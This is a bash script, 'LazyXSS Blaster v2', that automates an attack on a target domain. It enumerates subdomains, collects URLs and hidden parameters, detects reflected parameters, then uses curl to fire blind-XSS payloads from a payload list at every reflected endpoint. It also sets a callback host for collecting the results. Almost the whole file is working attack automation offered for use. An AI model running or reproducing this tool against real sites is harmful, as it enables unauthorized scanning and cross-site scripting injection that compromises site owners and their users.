#!/bin/bash

# LazyXSS Blaster v2 - Full Recon + Param Hunter + Visual Recon + BXSS Injection
# Author: Kdairatchi / GPT XSS Division

domain="$1"
bxss_url="https://xss0r.com/c/azgnt"
outdir="lazyxss_output"
payload_log="$outdir/payloads_used.txt"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

if [ -z "$domain" ]; then
    echo -e "${RED}[!] Usage: $0 <domain.com>${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Starting LazyXSS v2 on: $domain${NC}"
mkdir -p "$outdir" && cd "$outdir"
rm -f subs.txt raw_urls.txt urls.txt reflections.txt params_arjun.txt params_paramspider.txt "$payload_log"

############################################
### Phase 1: Recon
############################################

echo -e "${GREEN}[+] Enumerating subdomains...${NC}"
subfinder -d "$domain" -silent | tee subs.txt

echo -e "${GREEN}[+] Gathering URLs (katana, gau, wayback, urlfinder, waymore)...${NC}"
while read sub; do
    urlfinder -d "$sub"
    katana -u "https://$sub" -silent -js -rf
    gau "$sub"
    waybackurls "$sub"
    waymore -i "$sub" -mode U -silent -o "waymore_$sub.txt"
done < subs.txt > raw_urls.txt 2>/dev/null

cat raw_urls.txt waymore_*.txt 2>/dev/null | grep "$domain" | grep "=" | sort -u > urls.txt

############################################
### Phase 2: Param Discovery
############################################

echo -e "${CYAN}[+] Finding hidden parameters with Arjun...${NC}"
cat urls.txt | head -n 100 | while read url; do
    arjun -u "$url" --get -o params_arjun.txt > /dev/null 2>&1
    # Arjun appends to the file by default, no need for temp file
done
sort -u params_arjun.txt -o params_arjun.txt

echo -e "${CYAN}[+] Running ParamSpider on subdomains...${NC}"
python3 /opt/ParamSpider/paramspider.py -d "$domain" --level high --output paramspider_out > /dev/null
cat paramspider_out/*.txt 2>/dev/null | sort -u > params_paramspider.txt

cat urls.txt params_arjun.txt params_paramspider.txt | sort -u > full_param_urls.txt

############################################
### Phase 3: Reflections & Injection
############################################

echo -e "${GREEN}[+] Detecting reflected params with kxss...${NC}"
cat full_param_urls.txt | kxss | tee reflections.txt

echo -e "${YELLOW}[~] Injecting BXSS payloads to reflections...${NC}"
echo "" > "$payload_log"

payload_file="../xss.txt"  # path to payload list
if [[ ! -f "$payload_file" ]]; then
  echo -e "${RED}[!] Missing payload file: $payload_file${NC}"
  exit 1
fi

echo -e "${YELLOW}[~] Injecting BXSS payloads from $payload_file...${NC}"
echo "" > "$payload_log"

cat reflections.txt | grep -Po 'http[^ ]+' | sed 's/(/%28/g' | while read -r base_url; do
  echo -e "${CYAN}[*] Target: $base_url${NC}"
  while read -r payload; do
    encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri)
    injected_url=$(echo "$base_url" | sed "s/=.*/=$encoded_payload/")
    echo -e "${YELLOW}[+] Injecting: $injected_url${NC}"
    curl -sk "$injected_url" -o /dev/null
    echo "$injected_url" >> "$payload_log"
    sleep 1
  done < "$payload_file"
done

############################################
### Phase 4: Visual Recon (Aquatone)
############################################

echo -e "${GREEN}[+] Screenshotting reflected endpoints with Aquatone...${NC}"
cat reflections.txt | grep -Po 'http[^ ]+' | aquatone -out aquatone_report > /dev/null 2>&1

echo -e "${GREEN}[✓] DONE. BXSS Payloads logged to $payload_log${NC}"
echo -e "${CYAN}📸 Aquatone screenshots saved to $outdir/aquatone_report${NC}"
